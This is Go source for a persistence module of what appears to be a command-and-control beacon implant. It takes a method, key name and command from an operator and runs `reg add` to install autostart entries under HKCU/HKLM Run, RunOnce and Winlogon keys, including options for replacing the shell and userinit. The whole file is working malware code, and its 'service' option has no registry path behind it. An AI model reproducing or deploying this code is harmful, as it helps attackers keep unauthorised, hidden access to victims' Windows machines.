// Registry Persistence module - Windows registry-based persistence

func (b *GoBeacon) moduleRegistryPersistence(parameters string) string {
	var result strings.Builder
	result.WriteString("=== REGISTRY PERSISTENCE ===\n")

	if runtime.GOOS != "windows" {
		result.WriteString("Registry persistence is Windows-specific.\n")
		result.WriteString("For Unix systems, use AutostartPersistence module.\n")
		return result.String()
	}

	parts := strings.Split(parameters, ",")
	if len(parts) < 3 {
		result.WriteString("Registry persistence requires: method,key_name,command\n")
		result.WriteString("Available methods:\n")
		methods := b.getRegistryPersistenceMethods()
		for method, desc := range methods {
			result.WriteString(fmt.Sprintf("  %s: %s\n", method, desc))
		}
		return result.String()
	}

	method := strings.TrimSpace(parts[0])
	keyName := strings.TrimSpace(parts[1])
	command := strings.TrimSpace(parts[2])

	methods := b.getRegistryPersistenceMethods()
	if desc, exists := methods[method]; exists {
		result.WriteString(fmt.Sprintf("Using method: %s\n", desc))

		regPath := b.getRegistryPath(method)
		if regPath == "" {
			result.WriteString("ERROR: Invalid persistence method\n")
			return result.String()
		}

		regCommand := fmt.Sprintf("reg add \"%s\" /v \"%s\" /t REG_SZ /d \"%s\" /f", regPath, keyName, command)
		result.WriteString(fmt.Sprintf("Registry command: %s\n", regCommand))

		cmd := exec.Command("cmd", "/C", regCommand)
		output, err := cmd.Output()
		if err != nil {
			result.WriteString(fmt.Sprintf("ERROR: %v\n", err))
		} else {
			result.WriteString("Registry entry created successfully\n")
			result.WriteString(string(output))
		}
	} else {
		result.WriteString(fmt.Sprintf("Unknown method: %s\n", method))
	}

	return result.String()
}

func (b *GoBeacon) getRegistryPersistenceMethods() map[string]string {
	return map[string]string{
		"run":      "Current user Run key (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)",
		"runonce":  "Current user RunOnce key",
		"runall":   "All users Run key (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)",
		"service":  "Windows service registry",
		"winlogon": "Winlogon shell replacement",
		"userinit": "Userinit replacement",
		"explorer": "Explorer shell replacement",
	}
}

func (b *GoBeacon) getRegistryPath(method string) string {
	switch method {
	case "run":
		return "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	case "runonce":
		return "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
	case "runall":
		return "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	case "winlogon":
		return "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
	case "userinit":
		return "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
	case "explorer":
		return "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
	}
	return ""
}
